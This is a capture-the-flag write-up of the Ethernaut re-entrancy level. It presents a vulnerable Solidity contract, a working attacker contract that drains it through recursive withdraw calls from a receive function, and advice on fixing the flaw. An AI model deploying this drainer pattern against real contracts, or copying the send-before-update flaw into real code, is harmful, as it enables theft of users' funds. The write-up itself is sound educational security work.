![Re-entrancy](/assets/img/BigLevel10.svg)

- [Challenge](#challenge)
- [Solution](#solution)
- [Remediation](#remediation)
- [References](#references)
   
# Challenge

The level gives us the following information:

> The goal of this level is for you to steal all the funds from the contract.
>
>  Things that might help:
>
> - Untrusted contracts can execute code where you least expect it.
> - Fallback methods
> - Throw/revert bubbling
> - Sometimes the best way to attack a contract is with another contract.
> - See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

And presents us with the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

# Solution

We start by reading the contract's code and interacting with it.

This contract has three public functions which are: `donate()`, `balanceOf()` and `withdraw()`.

- `donate()`: takes an address as input and is declared as payable, so it can receive ETH. This function takes the received `msg.value` and adds it to the balance of the address received as input. If I execute `donate{value: 10}("0x0001")` it will add 10 Wei to the balance of the address "0x0001".

- `balanceOf()`: returns the balance of an address, in this example if we call `balanceOf("0x0001")` it will return 10 (or '0.00000000000000001' ETH).

- `withdraw()`: this function first checks if the input "_amount" is smaller or equal than the balance of the `msg.sender` (implying that only the sender can withdraw the funds and that they need to have that amount of eth, or more, in their balance). If the conditions passes, it will then send the requested amount to the `msg.sender` and update the balance of that address subtracting the withdrew amount.

Note that inside `withdraw()` there is a call to the `msg.sender` to transfer the requested amount. This `msg.sender` could be a wallet or a contract ;) . And, as in the previous level [King WriteUp](/2023-07-11-ethernaut-09-king-writeup/), the contract, can execute code through `receive()` or `fallback()` when funds are sent.

Also, if we look closer to the `withdraw()` function, we can see that it first transfer the requested funds and then updates the balance. This is a very important part of the re-entrancy vulnerabilities... 

Putting all this together, it would be possible to create a contract that:

1. Sends some ETH to the `Reentrance` contract, which will update the balance of it. Let's say 1 ETH.
2. Calls `withdraw()`, this will make the `Reentrance` contract to send back the 1 ETH sent in the previous step.
3. Defines a `fallback()`, this function will be executed when `Reentrance` calls this statement `(bool result,) = msg.sender.call{value:_amount}("");`. Remember that at this point, the balance wasn't updated yet.
4. Inside `fallback()`, the contract can call `withdraw()` again, as the balance wasn't updated yet, the contract will send us the requested ETH again (if it has the funds in its balance) and it will continue repeating this step until there is no ETH left to withdraw. Stealing then all the funds of the contract. Just what we need to pass the level ;)

Before writing this to code, let's see how much ETH does the contract have:

```javascript
web3.utils.toWei(await getBalance(contract.address))
'1000000000000000'
```

Which is the same as saying 0.001 ETH.

Now, let's code the `Solver.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract Solver {
    Reentrance reentrance;

    constructor(address payable _reentranceAddress) public {
        reentrance = Reentrance(_reentranceAddress);
    }

    receive() external payable {
        if (address(reentrance).balance >= 1000000000000000) {
            reentrance.withdraw(1000000000000000);
        }

    }

    function solve() public payable {
        require(msg.value == 1000000000000000, "Send 1000000000000000 Wei");
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
        (bool status, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(status);
    }
}
```

*Note: after withdrawing all the balance of the contract, I added a statement to send stolen funds back to our wallet, so we don't lose those funds :)*

Now we can deploy this `Solver.sol` with the `Reentrance` address as input. And then execute `solve()` sending 1000000000000000 Wei to it. This will make the contract to send 0.001 ETH to the target, incrementing its balance, then call withdraw which will make the target to send us back the 0.001 ETH, activating thus the `receive()` function, which will withdraw the remaining 0.001 ETH that the target has on its balance. Stealing thus all the funds :)

After doing this, we can check again the balance of the contract:

```javascript
web3.utils.toWei(await getBalance(contract.address))
'0'
```

So, that's it! We just won the level :D, now we only have to click "Submit Instance".

![Well done](/assets/img/ethernaut_solved.png)

# Remediation

- Make sure all internal state changes are performed before the call is executed. This is known as the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern).
- Use a reentrancy lock (ie. [OpenZeppelin's ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)).

# References

- [SWC-107](https://swcregistry.io/docs/SWC-107)
- [Hack Solidity: Reentrancy Attack](https://hackernoon.com/hack-solidity-reentrancy-attack)